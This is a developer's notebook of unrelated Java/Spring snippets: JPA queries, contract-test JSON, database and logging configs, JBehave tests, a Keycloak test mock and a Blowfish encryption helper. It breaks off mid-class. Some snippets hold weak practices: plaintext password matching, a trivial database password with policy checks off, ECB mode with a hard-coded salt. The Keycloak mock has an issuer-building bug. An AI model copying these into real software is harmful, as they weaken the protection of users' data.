@Scope(value= WebApplicationContext.SCOPE_SESSION, proxyMode = ScopedProxyMode.TARGET_CLASS)

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import ro.fmi.rpg.dao.entity.User;

/**
 * Created by User on 11/13/2016.
 */
public interface UserRepository extends JpaRepository<User, Integer> {

    @Query("SELECT u FROM User u " +
            " WHERE u.email = :email AND u.password = :password")
    User findUserByEmailAndPassword(@Param("email") String email, @Param("password") String password);

    @Query("SELECT u FROM User u " +
            " WHERE u.email = :email")
    User findUserByEmail(@Param("email") String email);

}

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import ro.fmi.rpg.dao.entity.Task;

import java.util.List;

/**
 * Created by User on 12/11/2016.
 */
public interface TaskRepository  extends JpaRepository<Task, Integer> {

    @Query(" SELECT t FROM Task t " +
            "LEFT JOIN FETCH t.category c " +
            "INNER JOIN c.user u " +
            "WHERE u.id = :userId")
    List<Task> findUserTasks(@Param("userId") int userId);

    @Query(" SELECT t FROM Task t " +
            "LEFT JOIN FETCH t.category c " +
            "LEFT JOIN FETCH c.user u")
    List<Task> findAllLefJoinFetch();
}

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import ro.fmi.rpg.dao.entity.UserFriend;
import ro.fmi.rpg.to.FriendModel;
import ro.fmi.rpg.to.LeaderBoardModel;

import java.util.List;

/**
 * Created by User on 1/8/2017.
 */
public interface FriendsRepository extends JpaRepository<UserFriend, Integer>{

    @Query(" SELECT new ro.fmi.rpg.to.FriendModel(f.id, f.firstName, f.lastName, c.level, c.experience, c.health, false, c.picture) " +
            " FROM UserFriend uf " +
            " INNER JOIN uf.friend f " +
            " INNER JOIN f.character c " +
            " WHERE uf.user.id = :userId")
    List<FriendModel> getFriendsByUser(@Param("userId") Integer userId);

    @Query(" SELECT uf FROM UserFriend uf " +
            " WHERE (uf.friend.id = :friendId AND uf.user.id = :userId) OR (uf.friend.id = :userId AND uf.user.id = :friendId)")
    List<UserFriend> findByFriendId(@Param("userId")Integer userId, @Param("friendId") Integer friendId);

    @Query(" SELECT uf FROM UserFriend uf " +
            " WHERE uf.friend.email = :email AND uf.user.id = :userId")
    UserFriend findFriendByEmail(@Param("userId") Integer userId, @Param("email") String email);

    @Query( " SELECT f.id FROM UserFriend uf " +
            " INNER JOIN uf.friend f " +
            " WHERE uf.user.id = :userId AND f.receivesToasts = '1'")
    List<Integer> getFriendIdsByUser(@Param("userId") Integer id);

    @Query( " SELECT new ro.fmi.rpg.to.LeaderBoardModel(f.firstName, f.lastName, c.picture, c.level, f.email) FROM UserFriend uf " +
            " INNER JOIN uf.friend f " +
            " INNER JOIN f.character c " +
            " WHERE uf.user.id = :userId")
    List<LeaderBoardModel> getScoreBoard(@Param("userId") Integer id);
}
==============================================================================================================
"response": {
                "status": 404,
                "headers": {
                    "Content-Type": "application/json; charset=UTF-8"
                },
                "body": {
                    // body sample
                },
                "matchingRules": {
                    "$.header.Content-Type": {
                        "match": "regex",
                        "regex": "^application\\/json; charset=(utf|UTF)-8$"
                    },
                   // body matching rules
            },
==============================================================================================================
https://www.testersfindaway.com/2019/02/19/testing-your-contracts-3-5/

"generators": { 
                    "body": { 
                        "$.employee.id": { 
                            "type": "RandomInt", 
                            "min": 0, 
                            "max": 2147483647 
                        }, 
                        "$.employee.firstName": { 
                            "type": "RandomString", 
                            "size": 20 
                        }, 
                        "$.employee.surname": { 
                            "type": "RandomString", 
                            "size": 20 
                        } 
                    }
                }
==============================================================================================================
https://blog.risingstack.com/advanced-contract-testing-pact-verification-with-pattern-matching/
<modifySql>
     <replace replace="filter" with="FILTER"/>
 </modifySql>
 
 mvn liquibase:update
 mvn liquibase:updateSQL
==============================================================================================================
mvn -pl persistence spring-boot:run

https://www.baeldung.com/spring-boot-access-h2-database-multiple-apps
https://brightinventions.pl/blog/clear-database-in-spring-boot-tests/

CREATE DATABASE [@userName@]
CONTAINMENT = NONE;

USE [@userName@]
;
IF NOT EXISTS (SELECT name FROM sys.filegroups WHERE is_default=1 AND name = N'PRIMARY') ALTER DATABASE [@userName@] MODIFY FILEGROUP [PRIMARY] DEFAULT
;
 
CREATE LOGIN [@userName@] WITH PASSWORD=N'password', DEFAULT_DATABASE=[@userName@], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
CREATE USER [@userName@] FOR LOGIN [@userName@];
ALTER ROLE [db_owner] ADD MEMBER [@userName@];

url: jdbc:p6spy:h2:mem:distributor;MODE=PostgreSQL;DATABASE_TO_LOWER=TRUE;DB_CLOSE_ON_EXIT=FALSE;IFEXISTS=FALSE;DB_CLOSE_DELAY=-1;TRACE_LEVEL_FILE=3;TRACE_LEVEL_SYSTEM_OUT=3;
==============================================================================================================
logging.level.org.springframework.web=INFO
spring.datasource.url=jdbc:h2:mem:challenge;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE;MV_STORE=FALSE
spring.datasource.driver-class-name=org.h2.Driver
spring.datasource.schema=classpath:/schema.sql
spring.datasource.data=classpath:/data.sql
spring.h2.console.enabled=true
spring.h2.console.path=/h2
server.port = 8080
==============================================================================================================
<configuration>

    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <!-- encoders are assigned the type
             ch.qos.logback.classic.encoder.PatternLayoutEncoder by default -->
        <encoder>
            <pattern>%d{dd/MM/yyyy HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>


    <!--<logger name="io.micronaut.http.server.netty.RoutingInBoundHandler" level="DEBUG"/>-->

    <logger name="io.micronaut.http.server.netty" additivity="false" level="DEBUG">
        <appender-ref ref="STDOUT"/>
    </logger>
    <logger name="io.micronaut.http" additivity="false" level="DEBUG">
        <appender-ref ref="STDOUT"/>
    </logger>


    <root level="info">
        <appender-ref ref="STDOUT" />
    </root>

</configuration>
==============================================================================================================
    @PostConstruct
    private void initDb() {
        System.out.println("****** Inserting more sample data in the table: Employees ******");
        String sqlStatements[] = {
            "insert into employees(first_name, last_name) values('Donald','Trump')",
            "insert into employees(first_name, last_name) values('Barack','Obama')"
        };

        Arrays.asList(sqlStatements).stream().forEach(sql -> {
            System.out.println(sql);
            jdbcTemplate.execute(sql);
        });

        System.out.println(String.format("****** Fetching from table: %s ******", "Employees"));
        jdbcTemplate.query("select id,first_name,last_name from employees",
            new RowMapper<Object>() {
                @Override
                public Object mapRow(ResultSet rs, int i) throws SQLException {
                    System.out.println(String.format("id:%s,first_name:%s,last_name:%s",
                        rs.getString("id"),
                        rs.getString("first_name"),
                        rs.getString("last_name")));
                    return null;
                }
            });
    }
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-war-plugin</artifactId>
    <version>2.4</version>
    <configuration>
        <attachClasses>true</attachClasses>
    </configuration>
</plugin>

Feature: calculation

Narrative:
As a user
I want to perform an action
So that I can achieve a business goal

Scenario: 2 squared
Given a variable x with value 2
When I multiply x by 2
Then result should equal 4

Scenario: 3 squared
Given a variable x with value 3
When I multiply x by 3
Then result should equal 9

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.config.ConfigurableBeanFactory;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Service;

/**
 * Our application has a lot of moving parts so it made sense to wrap some of the operations in an integration test
 * session.
 * Created by andrew on 11/18/15.
 */
@Service
@Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE)
public class IntegrationTestSession {

    @Autowired
    private ApplicationService applicationService;

    private int x;

    public void setX(int x) {
        this.x = x;
    }

    public int multiply(int y) {
        return applicationService.multiply(x, y);
    }
}

@Component
public class TestSteps {

    @Autowired
    private ApplicationContext applicationContext;

    private IntegrationTestSession testSession;
    private int result;

    @Given("a variable x with value $value")
    public void givenXValue(@Named("value") int value) {
        testSession = applicationContext.getBean(IntegrationTestSession.class);
        testSession.setX(value);
    }

    @When("I multiply x by $value")
    public void whenImultiplyXBy(@Named("value") int value) {
        result = testSession.multiply(value);
    }

    @Then("result should equal $value")
    public void thenXshouldBe(@Named("value") int value) {
        if (value != result)
            throw new RuntimeException("result is " + result + ", but should be " + value);
    }
}

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-core</artifactId>
            <version>${jbehave.version}</version>
        </dependency>

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-spring</artifactId>
            <version>${jbehave.version}</version>
        </dependency>

        <dependency>
            <groupId>org.jbehave.site</groupId>
            <artifactId>jbehave-site-resources</artifactId>
            <version>3.1.1</version>
            <type>zip</type>
        </dependency>

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-core</artifactId>
            <version>${jbehave.version}</version>
            <classifier>resources</classifier>
            <type>zip</type>
        </dependency>
		
		<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>2.17</version>
    <configuration>
        <testSourceDirectory>${basedir}/src/main/java/</testSourceDirectory>
        <testClassesDirectory>${project.build.directory}/classes/</testClassesDirectory>
        <includes>
            <include>example/jbehave/tests/stories/**/*.java</include>
        </includes>
    </configuration>
</plugin>
==============================================================================================================
import example.jbehave.app.domain.Money;
import org.jbehave.core.annotations.AsParameterConverter;
import org.jbehave.core.steps.ParameterConverters;
import org.springframework.util.StringUtils;

@Converter
public class MoneyConverter {

    @AsParameterConverter
    public Money convertPercent(String value) {
        if (StringUtils.isEmpty(value)) {
            return null;
        }

        String[] tokens = value.split("\\s");
        if (tokens.length != 2) {
            throw new ParameterConverters.ParameterConvertionFailed("Expected 2 tokens (amount and currency) but got " + tokens.length + ", value: " + value + ".");
        }

        return new Money(tokens[0], tokens[1]);
    }
}

==============================================================================================================
TASKKILL /IM notepad.exe
    TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
    TASKKILL /F /IM cmd.exe /T
    TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
    TASKKILL /F /FI "USERNAME eq NT AUTHORITY\SYSTEM" /IM notepad.exe
    TASKKILL /S system /U domain\username /FI "USERNAME ne NT*" /IM *
    TASKKILL /S system /U username /P password /FI "IMAGENAME eq note*"
==============================================================================================================
import lankydan.tutorial.documents.OrderTransaction;
import lankydan.tutorial.repositories.OrderTransactionRepository;
import org.springframework.jms.annotation.JmsListener;
import org.springframework.stereotype.Component;

@Component
public class OrderTransactionReceiver {

    private final OrderTransactionRepository transactionRepository;

    private int count = 1;

    public OrderTransactionReceiver(OrderTransactionRepository transactionRepository) {
        this.transactionRepository = transactionRepository;
    }

    @JmsListener(destination = "OrderTransactionQueue", containerFactory = "myFactory")
    public void receiveMessage(OrderTransaction transaction) {
        System.out.println("<" + count + "> Received <" + transaction + ">");
        count++;
        transactionRepository.save(transaction);
    }
}

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.jms.DefaultJmsListenerContainerFactoryConfigurer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.mongodb.repository.config.EnableMongoRepositories;
import org.springframework.jms.annotation.EnableJms;
import org.springframework.jms.config.DefaultJmsListenerContainerFactory;
import org.springframework.jms.config.JmsListenerContainerFactory;
import org.springframework.jms.support.converter.MappingJackson2MessageConverter;
import org.springframework.jms.support.converter.MessageConverter;
import org.springframework.jms.support.converter.MessageType;

import javax.jms.ConnectionFactory;

@EnableJms
@ComponentScan(basePackages = "lankydan.tutorial")
@EnableMongoRepositories(basePackages = "lankydan.tutorial")
@SpringBootApplication
public class Application {

  public static void main(String[] args) {
    SpringApplication.run(Application.class, args);
  }

  // Only required due to defining myFactory in the receiver
  @Bean
  public JmsListenerContainerFactory<?> myFactory(
      ConnectionFactory connectionFactory,
      DefaultJmsListenerContainerFactoryConfigurer configurer) {
    DefaultJmsListenerContainerFactory factory = new DefaultJmsListenerContainerFactory();
    factory.setErrorHandler(t -> System.out.println("An error has occurred in the transaction"));
    configurer.configure(factory, connectionFactory);
    return factory;
  }

  // Serialize message content to json using TextMessage
  @Bean
  public MessageConverter jacksonJmsMessageConverter() {
    MappingJackson2MessageConverter converter = new MappingJackson2MessageConverter();
    converter.setTargetType(MessageType.TEXT);
    converter.setTypeIdPropertyName("_type");
    return converter;
  }
}






import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import com.datastax.driver.core.Cluster;
import com.datastax.driver.core.Session;
import com.datastax.driver.core.querybuilder.QueryBuilder;
import com.datastax.driver.core.schemabuilder.SchemaBuilder;
import com.datastax.driver.mapping.*;
import org.apache.commons.io.IOUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import static com.datastax.driver.core.schemabuilder.SchemaBuilder.createKeyspace;
import static com.datastax.driver.mapping.NamingConventions.*;
import static org.apache.commons.lang3.StringUtils.*;

@Configuration
public class CassandraConfig {

  @Bean
  public Cluster cluster(
      @Value("${cassandra.host:127.0.0.1}") String host,
      @Value("${cassandra.cluster.name:cluster}") String clusterName,
      @Value("${cassandra.port:9042}") int port) {
    return Cluster.builder()
        .addContactPoint(host)
        .withPort(port)
        .withClusterName(clusterName)
        .build();
  }

  @Bean
  public Session session(Cluster cluster, @Value("${cassandra.keyspace}") String keyspace)
      throws IOException {
    //    final Session session = cluster.connect(keyspace);
    final Session session = cluster.connect();
    setupKeyspace(session, keyspace);
    return session;
  }

  private void setupKeyspace(Session session, String keyspace) throws IOException {
    final Map<String, Object> replication = new HashMap<>();
    replication.put("class", "SimpleStrategy");
    replication.put("replication_factor", 1);
    session.execute(createKeyspace(keyspace).ifNotExists().with().replication(replication));
    session.execute("USE " + keyspace);
    //    String[] statements =
    // split(IOUtils.toString(getClass().getResourceAsStream("/cql/setup.cql")), ";");
    //    Arrays.stream(statements).map(statement -> normalizeSpace(statement) +
    // ";").forEach(session::execute);
  }

  @Bean
  public MappingManager mappingManager(Session session) {
    final PropertyMapper propertyMapper =
        new DefaultPropertyMapper()
            .setNamingStrategy(new DefaultNamingStrategy(LOWER_CAMEL_CASE, LOWER_SNAKE_CASE));
    final MappingConfiguration configuration =
        MappingConfiguration.builder().withPropertyMapper(propertyMapper).build();
    return new MappingManager(session, configuration);
  }
}


import com.lankydanblog.tutorial.person.Person;
import org.springframework.web.reactive.function.client.ClientResponse;
import org.springframework.web.reactive.function.client.WebClient;
import reactor.core.publisher.Mono;

import java.util.UUID;

import static org.springframework.http.MediaType.APPLICATION_JSON;

public class Client {

  private WebClient client = WebClient.create("http://localhost:8080");

  public void doStuff() {

    // POST
    final Person record = new Person(UUID.randomUUID(), "John", "Doe", "UK", 50);
    final Mono<ClientResponse> postResponse =
        client
            .post()
            .uri("/people")
            .body(Mono.just(record), Person.class)
            .accept(APPLICATION_JSON)
            .exchange();
    postResponse
        .map(ClientResponse::statusCode)
        .subscribe(status -> System.out.println("POST: " + status.getReasonPhrase()));

    // GET
    client
        .get()
        .uri("/people/{id}", "a4f66fe5-7c1b-4bcf-89b4-93d8fcbc52a4")
        .accept(APPLICATION_JSON)
        .exchange()
        .flatMap(response -> response.bodyToMono(Person.class))
        .subscribe(person -> System.out.println("GET: " + person));

    // ALL
    client
        .get()
        .uri("/people")
        .accept(APPLICATION_JSON)
        .exchange()
        .flatMapMany(response -> response.bodyToFlux(Person.class))
        .subscribe(person -> System.out.println("ALL: " + person));

    // PUT
    final Person updated = new Person(UUID.randomUUID(), "Peter", "Parker", "US", 18);
    client
        .put()
        .uri("/people/{id}", "ec2212fc-669e-42ff-9c51-69782679c9fc")
        .body(Mono.just(updated), Person.class)
        .accept(APPLICATION_JSON)
        .exchange()
        .map(ClientResponse::statusCode)
        .subscribe(response -> System.out.println("PUT: " + response.getReasonPhrase()));

    // DELETE
    client
        .delete()
        .uri("/people/{id}", "ec2212fc-669e-42ff-9c51-69782679c9fc")
        .exchange()
        .map(ClientResponse::statusCode)
        .subscribe(status -> System.out.println("DELETE: " + status));
  }
}




import com.lankydan.event.Event;
import com.lankydan.event.EventKey;
import org.springframework.data.cassandra.repository.CassandraRepository;
import org.springframework.data.cassandra.repository.Query;
import org.springframework.stereotype.Repository;

import java.time.LocalDateTime;

@Repository
public interface EventRepository extends CassandraRepository<Event, EventKey> {

  @Query("select avg(value) from event where type = ?0 and start_time > ?1")
  long getAverageValueGreaterThanStartTime(final String type, final LocalDateTime startTime);
}

import com.lankydan.event.Event;
import com.lankydan.event.EventKey;
import com.lankydan.event.repository.EventRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.UUID;

@Component
public class EventCreator {

  private static final Logger LOG = LoggerFactory.getLogger(EventCreator.class);

  private final EventRepository eventRepository;

  public EventCreator(final EventRepository eventRepository) {
    this.eventRepository = eventRepository;
  }

  @Scheduled(fixedRate = 1000)
  public void create() {
    final LocalDateTime start = LocalDateTime.now();
    eventRepository.save(
        new Event(new EventKey("An event type", start, UUID.randomUUID()), Math.random() * 1000));
    LOG.debug("Event created!");
  }
}
==============================================================================================================
import com.tngtech.keycloakmock.api.KeycloakVerificationMock;
import com.tngtech.keycloakmock.api.TokenConfig;
import org.junit.jupiter.api.extension.AfterAllCallback;
import org.junit.jupiter.api.extension.BeforeAllCallback;
import org.junit.jupiter.api.extension.ExtensionContext;

/**
 * A JUnit5 extension to be used to automatically start and stop the keycloak mock.
 *
 * <p>Example use:
 *
 * <pre><code>
 * {@literal @}RegisterExtension
 *  static KeycloakMock mock = new KeycloakMock();
 *
 * {@literal @}Test
 *  void testStuff() {
 *    String token = mock.getAccessToken(aTokenConfig().build());
 *  }
 * </code></pre>
 */
public class KeycloakMock implements BeforeAllCallback, AfterAllCallback {

  private final KeycloakVerificationMock mock;

  /**
   * Create a mock instance for a given realm.
   *
   * <p>The instance generates tokens for realm 'master'. If you want to use a different realm, use
   * {@link KeycloakMock#KeycloakMock(int, String)} instead.
   *
   * <p>The JWKS endpoint listens at port 8000. If you need a different port, use {@link
   * KeycloakMock#KeycloakMock(int, String)} instead.
   *
   * <p>The JWKS endpoint is served via HTTP. If you need HTTPS, use {@link
   * KeycloakMock#KeycloakMock(int, String, boolean)} instead.
   */
  public KeycloakMock() {
    this(8000, "master", false);
  }

  /**
   * Create a mock instance for a given realm.
   *
   * <p>The JWKS endpoint is served via HTTP. If you need HTTPS, use {@link
   * KeycloakMock#KeycloakMock(int, String, boolean)} instead.
   *
   * @param port the port of the mock to run (e.g. 8000)
   * @param realm the realm for which to provide tokens
   */
  public KeycloakMock(final int port, final String realm) {
    this(port, realm, false);
  }

  /**
   * Create a mock instance for a given realm.
   *
   * <p>Depending on the tls parameter, the JWKS endpoint is served via HTTP or HTTPS.
   *
   * @param port the port of the mock to run (e.g. 8000)
   * @param realm the realm for which to provide tokens
   * @param tls whether to use HTTPS instead of HTTP
   */
  public KeycloakMock(final int port, final String realm, final boolean tls) {
    this.mock = new KeycloakVerificationMock(port, realm, tls);
  }

  /**
   * Get a signed access token for the given parameters.
   *
   * @param tokenConfig the configuration of the token to generate
   * @return an access token in compact JWT form
   * @see TokenConfig.Builder
   */
  public String getAccessToken(final TokenConfig tokenConfig) {
    return mock.getAccessToken(tokenConfig);
  }

  @Override
  public void beforeAll(final ExtensionContext context) {
    mock.start();
  }

  @Override
  public void afterAll(final ExtensionContext context) {
    mock.stop();
  }
}
  @Bean
  public KeycloakSpringBootConfigResolver keycloakConfigResolver() {
    return new KeycloakSpringBootConfigResolver();
  }
  
  
  import io.vertx.core.AsyncResult;
import io.vertx.core.Handler;
import io.vertx.core.Vertx;
import io.vertx.core.buffer.Buffer;
import io.vertx.core.http.HttpServer;
import io.vertx.core.http.HttpServerOptions;
import io.vertx.core.net.JksOptions;
import io.vertx.ext.web.Router;
import io.vertx.ext.web.RoutingContext;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Objects;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import javax.annotation.Nonnull;

/**
 * A mock of a keycloak instance capable of producing access tokens.
 *
 * <p>This can be used in component tests of REST endpoints that are secured via Keycloak. The mock
 * provides a JWKS endpoint so the signature of the access token can be verified.
 *
 * <p>Typically, you should not need to use this class directly. Consider using {@code
 * com.tngtech.keycloakmock.junit.KeycloakMock} from module mock-junit or {@code
 * com.tngtech.keycloakmock.junit5.KeycloakMock} from module mock-junit5 instead.
 */
public class KeycloakVerificationMock {
  private static final String HTTP = "http";
  private static final String HTTPS = "https";
  @Nonnull private final TokenGenerator tokenGenerator;
  private final int port;
  @Nonnull private final String realm;
  private final boolean tls;
  @Nonnull private final String issuerPrefix;
  protected final Vertx vertx = Vertx.vertx();
  private HttpServer server;

  /**
   * Create a mock instance for a given realm.
   *
   * <p>The JWKS endpoint is served via HTTP. If you need HTTPS, use {@link
   * KeycloakVerificationMock#KeycloakVerificationMock(int, String, boolean)} instead.
   *
   * @param port the port of the mock to run (e.g. 8000)
   * @param realm the realm for which to provide tokens
   */
  public KeycloakVerificationMock(final int port, @Nonnull final String realm) {
    this(port, realm, false);
  }

  /**
   * Create a mock instance for a given realm.
   *
   * <p>Depending on the tls parameter, the JWKS endpoint is served via HTTP or HTTPS.
   *
   * @param port the port of the mock to run (e.g. 8000)
   * @param realm the realm for which to provide tokens
   * @param tls whether to use HTTPS instead of HTTP
   */
  public KeycloakVerificationMock(final int port, @Nonnull final String realm, final boolean tls) {
    this.port = port;
    this.realm = Objects.requireNonNull(realm);
    this.tls = tls;
    this.issuerPrefix = tls ? HTTPS : HTTP + "://localhost:" + port + "/auth/realms/";
    try {
      this.tokenGenerator = new TokenGenerator();
    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  /**
   * Get a signed access token for the given parameters.
   *
   * @param tokenConfig the configuration of the token to generate
   * @return an access token in compact JWT form
   * @see TokenConfig.Builder
   */
  @Nonnull
  public String getAccessToken(@Nonnull final TokenConfig tokenConfig) {
    return tokenGenerator.getToken(tokenConfig, getIssuer(realm));
  }

  @Nonnull
  protected String getAccessTokenForRealm(
      @Nonnull final TokenConfig tokenConfig, @Nonnull final String realm) {
    return tokenGenerator.getToken(tokenConfig, getIssuer(realm));
  }

  /** Start the server (blocking). */
  public void start() {
    HttpServerOptions options = new HttpServerOptions().setPort(port);
    if (tls) {
      options
          .setSsl(true)
          .setKeyStoreOptions(new JksOptions().setValue(getKeystore()).setPassword(""));
    }
    Router router = configureRouter();
    ResultHandler<HttpServer> startHandler = new ResultHandler<>();
    server =
        vertx
            .createHttpServer(options)
            .requestHandler(router)
            .exceptionHandler(Throwable::printStackTrace)
            .listen(startHandler);
    startHandler.await();
  }

  protected Router configureRouter() {
    Router router = Router.router(vertx);
    router.get("/auth/realms/:realm/protocol/openid-connect/certs").handler(this::getJwksResponse);
    return router;
  }

  /** Stop the server (blocking). */
  public void stop() {
    ResultHandler<Void> stopHandler = new ResultHandler<>();
    server.close(stopHandler);
    stopHandler.await();
  }

  private Buffer getKeystore() {
    try {
      InputStream inputStream = this.getClass().getResourceAsStream("/keystore.jks");
      ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
      byte[] buf = new byte[8192];
      int n;
      while ((n = inputStream.read(buf)) > 0) {
        outputStream.write(buf, 0, n);
      }
      return Buffer.buffer(outputStream.toByteArray());
    } catch (IOException e) {
      e.printStackTrace();
      throw new RuntimeException(e);
    }
  }

  private void getJwksResponse(final RoutingContext routingContext) {
    routingContext
        .response()
        .putHeader("content-type", "application/json")
        .end(tokenGenerator.getJwksResponse());
  }

  @Nonnull
  private String getIssuer(@Nonnull final String realm) {
    return issuerPrefix + Objects.requireNonNull(realm);
  }

  private static class ResultHandler<E> implements Handler<AsyncResult<E>> {
    private final CompletableFuture<Void> future = new CompletableFuture<>();

    @Override
    public void handle(AsyncResult<E> result) {
      if (result.succeeded()) {
        future.complete(null);
      } else {
        future.completeExceptionally(result.cause());
      }
    }

    void await() {
      try {
        future.get();
      } catch (InterruptedException | ExecutionException e) {
        e.printStackTrace();
        throw new RuntimeException(e);
      }
    }
  }
}

import org.keycloak.adapters.springsecurity.KeycloakConfiguration;
import org.keycloak.adapters.springsecurity.config.KeycloakWebSecurityConfigurerAdapter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.authentication.session.NullAuthenticatedSessionStrategy;
import org.springframework.security.web.authentication.session.SessionAuthenticationStrategy;

@KeycloakConfiguration
public class WebSecurityConfig extends KeycloakWebSecurityConfigurerAdapter {

  @Override
  protected void configure(final HttpSecurity http) throws Exception {
    super.configure(http);
    http.csrf()
        .disable()
        .sessionManagement()
        .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        .and()
        .authorizeRequests()
        .antMatchers(HttpMethod.OPTIONS, "/**")
        .permitAll()
        .antMatchers("/**")
        .authenticated();
  }

  @Override
  protected SessionAuthenticationStrategy sessionAuthenticationStrategy() {
    return new NullAuthenticatedSessionStrategy();
  }

  @Autowired
  public void configureGlobal(final AuthenticationManagerBuilder auth) {
    auth.authenticationProvider(keycloakAuthenticationProvider());
  }
}


public enum ResolveStrategy {
    /**
     * Strategy which stops after the first resolver returns valid dataproviders (= non-empty list) or no further
     * resolvers are available.
     */
    UNTIL_FIRST_MATCH,

    /**
     * Loops over all resolvers and aggregates all resulting dataproviders.
     */
    AGGREGATE_ALL_MATCHES,
}



import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.UnsupportedEncodingException;
import java.security.GeneralSecurityException;
import java.util.Base64;

public class Obfuscator {

    private static final String ENCRYPTION_ALGORITHM = "Blowfish";
    private static final String ENCRYPTION_ALGORITHM_MODIFIER = "/ECB/PKCS5Padding";
    private static final String ENCODING = "UTF-8";

    private final Base64.Encoder base64Encoder = Base64.getEncoder();
    private final Base64.Decoder base64Decoder = Base64.getDecoder();
    private final SecretKeySpec dataEncryptionSecretKeySpec;

    public Obfuscator(String password) {
        byte[] salt = {65, 110, 100, 114, 111, 105, 100, 75, 105, 116, 75, 97, 116, 13, 1, 20, 20, 9, 1, 19};
        SecretKeyFactory factory;
        try {
            factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            SecretKey tmp = factory.generateSecret(new PBEKeySpec(password.toCharArray(), salt, 100, 128));
            dataEncryptionSecretKeySpec = new SecretKeySpec(tmp.getEncoded(), ENCRYPTION_ALGORITHM);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Encrypt and base64-encode a String.
     *
     * @param toEncrypt - the String to encrypt.
     * @return the Blowfish-encrypted and base64-encoded String.
     */
    public String encrypt(String toEncrypt) {
        byte[] encryptedBytes = encryptInternal(dataEncryptionSecretKeySpec, toEncrypt);
        return new String(base64Encoder.encode(encryptedBytes));
    }

    /**
     * Internal Encryption method.
     *
     * @param key       - the SecretKeySpec used to encrypt
     * @param toEncrypt - the String to encrypt
     * @return the encrypted String (as byte[])
     */
    private byte[] encryptInternal(SecretKeySpec key, String toEncrypt) {
        try {
            Cipher cipher = Cipher.getInstance(ENCRYPTION_ALGORITHM + ENCRYPTION_ALGORITHM_MODIFIER);
            cipher.init(Cipher.ENCRYPT_MODE, key);
            return cipher.doFinal(toEncrypt.getBytes(ENCODING));
        } catch (GeneralSecurityException e) {
            throw new RuntimeException("Exception during decryptInternal: " + e, e);
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException("Exception during encryptInternal: " + e, e);
        }
    }

    /**
     * Decrypt an encrypted and base64-encoded String
     *
     * @param toDecrypt - the encrypted and base64-encoded String
     * @return the plaintext String
     */
    public String decrypt(String toDecrypt) {
        byte[] encryptedBytes = base64Decoder.decode(toDecrypt);
        return decryptInternal(dataEncryptionSecretKeySpec, encryptedBytes);
    }

    /**
     * Internal decryption method.
     *
     * @param key            - the SecretKeySpec used to decrypt
     * @param encryptedBytes - the byte[] to decrypt
     * @return the decrypted plaintext String.
     */
    private String decryptInternal(SecretKeySpec key, byte[] encryptedBytes) {
        try {
            Cipher cipher = Cipher.getInstance(ENCRYPTION_ALGORITHM + ENCRYPTION_ALGORITHM_MODIFIER);
            cipher.init(Cipher.DECRYPT_MODE, key);
            byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
            return new String(decryptedBytes, ENCODING);
        } catch (GeneralSecurityException e) {
            throw new RuntimeException("Exception during decryptInternal: " + e, e);
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException("Exception during encryptInternal: " + e, e);
        }
    }
}

import com.tngtech.demo.weather.resources.Paths;
import lombok.AllArgsConstructor;

import javax.ws.rs.DefaultValue;
import javax.ws.rs.QueryParam;

@AllArgsConstructor
public class WeatherQueryParam {
    @QueryParam(Paths.LATITUDE)
    final Double latitude;

    @QueryParam(Paths.LONGITUDE)
    final Double longitude;

    @DefaultValue("250.0")
    @QueryParam(Paths.RADIUS)
    final Double radius;
}


import com.tngtech.demo.weather.domain.gis.Point;
import org.springframework.stereotype.Component;

@Component
public class GeoCalculations {
    private static final double EARTH_RADIUS = 6372.8;

